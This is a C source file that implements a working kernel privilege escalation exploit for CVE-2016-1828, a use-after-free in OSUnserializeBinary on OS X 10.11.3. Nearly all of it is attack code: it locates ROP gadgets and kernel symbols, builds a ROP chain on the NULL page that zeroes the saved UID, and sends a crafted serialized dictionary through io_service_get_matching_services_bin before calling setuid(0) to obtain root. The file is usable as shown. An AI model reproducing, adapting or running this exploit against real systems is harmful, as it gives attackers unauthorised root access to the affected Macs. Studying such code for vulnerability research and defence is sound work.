/* kernel_rop.c
 * Brandon Azad
 *
 * Kernel instruction pointer control to execute the ROP payload.
 *
 * CVE-2016-1828:
 *   This vulnerability is a use-after-free in OSUnserializeBinary that can be
 *   triggered via the io_service_get_matching_services_bin Mach trap from
 *   user space.
 */

/*
 * Modified for targeting 0S X 10.11.3 build 15D21
 * By vvun91e0n
 */

#include "kernel_rop.h"

#include <IOKit/IOKitLib.h>
#include <IOKit/iokitmig.h>
#include <mach/mach.h>
#include <stdio.h>

#include "kernel_image.h"

static const uint8_t xchg_eax_esp_ins[] = {
	0x94,   /* xchg esp, eax */
	0xc3,   /* ret           */
};

static const uint8_t pop_rsp_ins[] = {
	0x5c,   /* pop rsp       */
	0xc3,   /* ret           */
};

static const uint8_t mov_rdi_rax_call_rbx_ins[] = {
	0x48, 0x89, 0xc7,   /* mov rdi, rax      */
	0xff, 0xd3,         /* call rbx          */
};

static const uint8_t pop_rbx_ins[] = {
	0x5b,   /* pop rbx       */
	0xc3,   /* ret           */
};

static const uint8_t set_svuid_0_ins[] = {
	0xc7, 0x47, 0x08, 0x00, 0x00, 0x00, 0x00,       /* mov dword ptr [rdi+8], 0 */
	0xc3,                                           /* ret                      */
};

/* Build the ROP payload that will be used to control code execution in the
   kernel. The payload is stored on the NULL page, so the kernel will panic if
   SMAP is enabled. The entry point is the instruction pointer stored in
   virtual method 4, which will pivot to the ROP stack. The ROP stack is placed
   at the end of the NULL page so that there's room for the stack frames of the
   functions we call.

   The payload itself sets the saved user ID to 0. Once we return from the
   kernel we can elevate privileges by calling seteuid(0). */
int
build_rop_payload() {
	uint64_t set_svuid_0;
    	uint64_t xchg_eax_esp, pop_rsp, mov_rdi_rax_call_rbx, pop_rbx;
	uint64_t current_proc, proc_ucred, posix_cred_get, thread_exception_return;
	int err = 0;
    	err |= find_kernel_bytes(xchg_eax_esp_ins, sizeof(xchg_eax_esp_ins),&xchg_eax_esp);
    	err |= find_kernel_bytes(pop_rsp_ins, sizeof(pop_rsp_ins),&pop_rsp);
    	err |= find_kernel_bytes(mov_rdi_rax_call_rbx_ins, sizeof(mov_rdi_rax_call_rbx_ins),&mov_rdi_rax_call_rbx);
    	err |= find_kernel_bytes(pop_rbx_ins, sizeof(pop_rbx_ins),&pop_rbx);
	err |= find_kernel_bytes(set_svuid_0_ins, sizeof(set_svuid_0_ins), &set_svuid_0);
	if (err) {
		printf("error: could not locate ROP gadgets\n");
		return 1;
	}
	err |= find_kernel_symbol("_current_proc", &current_proc);
	err |= find_kernel_symbol("_proc_ucred", &proc_ucred);
	err |= find_kernel_symbol("_posix_cred_get", &posix_cred_get);
	err |= find_kernel_symbol("_thread_exception_return", &thread_exception_return);
	if (err) {
		printf("error: could not locate symbols for ROP payload\n");
		return 2;
	}
	vm_address_t payload_addr = 0;
	size_t size = 0x1000;
	/* In case we are re-executing, deallocate the NULL page. */
	vm_deallocate(mach_task_self(), payload_addr, size);
	kern_return_t kr = vm_allocate(mach_task_self(), &payload_addr, size, 0);
	if (kr != KERN_SUCCESS) {
		printf("error: could not allocate NULL page for payload\n");
		return 3;
	}
	uint64_t * vtable = (uint64_t *)payload_addr;
	uint64_t * rop_stack = ((uint64_t *)(payload_addr + size)) - 14;
	/* Virtual method 4 is called in the kernel with rax set to 0. */
	vtable[0] = pop_rsp;                    /*  rsp = *0                        */
        vtable[1] = (uint64_t)rop_stack;        /*  *0x8 = rop_stack                */
	vtable[4] = xchg_eax_esp;               /*  rsp = 0; start rop              */
	
	rop_stack[0] = current_proc;            /*  rax = &proc                     */
	
    	rop_stack[1] = pop_rbx;                 /*  rbx = pop_rbx address           */
    	rop_stack[2] = pop_rbx;                 /*  pop call address ret            */
    	rop_stack[3] = mov_rdi_rax_call_rbx;    /*  rdi = rax   call rbx            */

	rop_stack[4] = proc_ucred;              /*  rax = &cred                     */

    	rop_stack[5] = pop_rbx;                 /*  rbx = pop_rbx address           */
    	rop_stack[6] = pop_rbx;                 /*  pop call address ret            */
    	rop_stack[7] = mov_rdi_rax_call_rbx;    /*  rdi = rax   call rbx            */

	rop_stack[8] = posix_cred_get;          /*  rax = &posix_cred               */

    	rop_stack[9] = pop_rbx;                 /*  rbx = pop_rbx address           */
    	rop_stack[10] = pop_rbx;                 /*  pop call address ret            */
    	rop_stack[11] = mov_rdi_rax_call_rbx;    /*  rdi = rax   call rbx            */

	rop_stack[12] = set_svuid_0;             /*  we are now setuid 0             */
	rop_stack[13] = thread_exception_return; /*  stop rop                        */
	return 0;
}

/* Trigger the use-after-free to start executing the ROP payload. If the ROP
   payload succeeds the UID and GID of the process will be set to 0. */
int
execute_rop_payload() {
	uint32_t data[] = {
		0x000000d3,                         /*     magic                             */
		0x81000010,                         /*  0: OSDictionary                      */
		0x08000002, 0x00000061,             /*  1: key "a"                           */
		0x04000020, 0x00000000, 0x00000000, /*  2: 1[2: OSNumber]                    */
		0x08000002, 0x00000062,             /*  3: key "b"                           */
		0x04000020, 0x00000000, 0x00000000, /*  4: 2[4: OSNumber]                    */
		0x0c000001,                         /*  5: key "a"                           */
		0x0b000001,                         /*  6: true ; heap freelist: 1[2:]       */
		0x0c000003,                         /*  7: key "b"                           */
		0x0b000001,                         /*  8: true ; heap freelist: 2[4:] 1[2:] */
		0x0c000001,                         /*  9: key "a"                           */
		0x0a000028,                         /* 10: 2[10,4: OSData] => 1[2: contents] */
		0x00000000, 0x00000000,             /*     vtable ptr                        */
		0x00000000, 0x00000000, 0x00000000, 0x00000000,
	       	0x00000000, 0x00000000, 0x00000000, 0x00000000,
		0x0c000001,                         /* 11: key "b"                           */
		0x8c000002,                         /* 12: 1[2: contents]->retain()          */
	};
	mach_port_t master_port, iterator;
	kern_return_t kr = IOMasterPort(MACH_PORT_NULL, &master_port);
	if (kr != KERN_SUCCESS) {
		return 1;
	}
	kr = io_service_get_matching_services_bin(master_port, (char *)data, sizeof(data), &iterator);
	seteuid(0);
	setuid(0);
	setgid(0);
	if (kr == KERN_SUCCESS) {
		IOObjectRelease(iterator);
	}
	if (getuid() == 0) {
		return 0;
	}
	printf("error: could not execute ROP payload\n");
	return 2;
}
